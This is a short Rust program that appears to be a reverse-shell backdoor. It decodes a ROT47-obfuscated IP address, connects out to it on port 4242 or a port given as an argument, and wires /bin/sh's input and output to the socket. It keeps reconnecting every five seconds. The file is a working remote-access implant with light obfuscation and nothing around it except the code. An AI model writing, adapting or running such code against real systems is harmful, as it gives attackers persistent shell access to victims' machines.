use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio}; 
use std::{thread, time};
use cienli::ciphers::rot::{Rot, RotType};

fn main() {
    let five_seconds = time::Duration::from_millis(5000);
    let args: Vec<String> = std::env::args().collect();
    let ipaddr_ciphered = Rot::new("`af]_]_]`", RotType::Rot47); //TARGET IP ENCODEDED WITH ROT47
    let ipaddr = ipaddr_ciphered.decipher();

    let port = if args.len() > 1 { args[1].clone() } else {String::from("4242")}; // Default port
    let connection_string = format!("{0}:{1}", String::from(ipaddr), port);
    
    loop {


        let socket: TcpStream;
        match TcpStream::connect(connection_string.clone()) {
            Ok(s) => socket = s,
            Err(_) => {
                thread::sleep(five_seconds);
                continue;
            }
        }

        let fd = socket.as_raw_fd();
        Command::new("/bin/sh")
            .stdin(unsafe { Stdio::from_raw_fd(fd) })
            .stdout(unsafe { Stdio::from_raw_fd(fd) })
            .stderr(unsafe { Stdio::from_raw_fd(fd) })
            .spawn()
            .unwrap()
            .wait()
            .unwrap();
    }
}
